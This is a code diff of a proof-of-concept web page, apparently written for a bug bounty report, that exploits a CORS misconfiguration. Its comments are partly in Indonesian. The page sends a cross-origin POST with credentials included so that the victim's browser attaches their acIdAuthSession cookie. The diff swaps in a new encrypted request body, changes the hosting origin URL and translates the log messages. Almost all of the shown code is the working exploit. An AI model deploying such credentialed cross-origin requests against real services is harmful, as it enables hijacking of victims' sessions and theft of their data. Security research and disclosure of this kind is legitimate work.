@@ -149,7 +149,7 @@
       // Tapi CORS-nya sudah terbukti reflect origin dari Burp — "Failed to fetch" sebelumnya
       // disebabkan X-Hackerone-Research header yang tidak ada di ACAH server, bukan karena body.
       const BODY =
-        '"H1ON8P/Uqk8Oh016MPsESLO95VPD3r036Cjr0l6T48g+jKKAWWhShjbbWbE11hnjuYS5ned88WXFB999041FKrOjvHc8dy6h/JzU7LjTQmbSW6pPvkdPgoamAXu+lQGLMiG8Dr8VP6EtvwcJFlti5f+v+wCa9UbXLSwlh3dkLRA=.bt7gd4/oE43AB6EXrj9ZxlU0etM/kMpXDYGLHQjQn/US+2uR5TP6AaEHuFUTjo+Bs1fsbFZRsnG3i7ifEp2yA76vwPJc9vCGBKWKeKR++pt6u9/GFMopLTg9aYUXc2vfHo4P43w35xiNDce3zidYWCadA7QKjG+abPE4r8Tlah8=.MFg="';
+        '"tiQXrTjflVRNI9usT+QwOmcSQtYRbk1BfYmIsFmSFTL3rq4DLc+otmWm0NZPyxSv0Ty1WPjvh/WSQCjBh6/AgN4K24gJPncwT1Q+pyuFGbBMRWyQtrK9065U92/dPRBLLTo+JW2AJ2lrSfBfXmmGVW6qVSrCbC/OfWZZKRC7U2w=.ToLJ8JradSvvuG7NTAWbKYN1gZbBWprv75YhVtCGPBVBK9rzWFvdGXL9EeAfSmOJGFVxABJ6N3Cgvzw/+cNph5c4PRjHLOzGgsRtCHsHfkYEoTJtiWsqHLCHnKEv5qXbEeHKuFMhXshR9zzDXTmPeHqwd+kjjhhkcn4Fph+qBYA=.e9U="';
 
       function log(text, cls = "") {
         const el = document.getElementById("output");
@@ -183,7 +183,7 @@
 
         document.getElementById("req-out").textContent =
           `POST ${TARGET}\n` +
-          `Origin: (dikirim otomatis oleh browser = https://ikur007.github.io)\n` +
+          `Origin: (dikirim otomatis oleh browser = https://ikur007.github.io/Corspocrealme.html)\n` +
           `credentials: include  ← browser akan attach cookie acIdAuthSession korban\n\n` +
           Object.entries(headers)
             .map(([k, v]) => `${k}: ${v}`)
@@ -191,13 +191,13 @@
           `\n\nBody (352 bytes, envelope-encrypted):\n${BODY.substring(0, 60)}...`;
 
         log(
-          "Mengirim request cross-origin dengan credentials...\n(Buka Console F12 untuk detail preflight)",
+          "Send request cross-origin with credentials...\n(open Console F12 for detail preflight)",
         );
 
         try {
           const res = await fetch(TARGET, {
             method: "POST",
-            credentials: "include", // ← browser kirim cookie sesi korban
+            credentials: "include", // ← browser send cookie session vitcim korban
             headers: headers,
             body: BODY,
           });
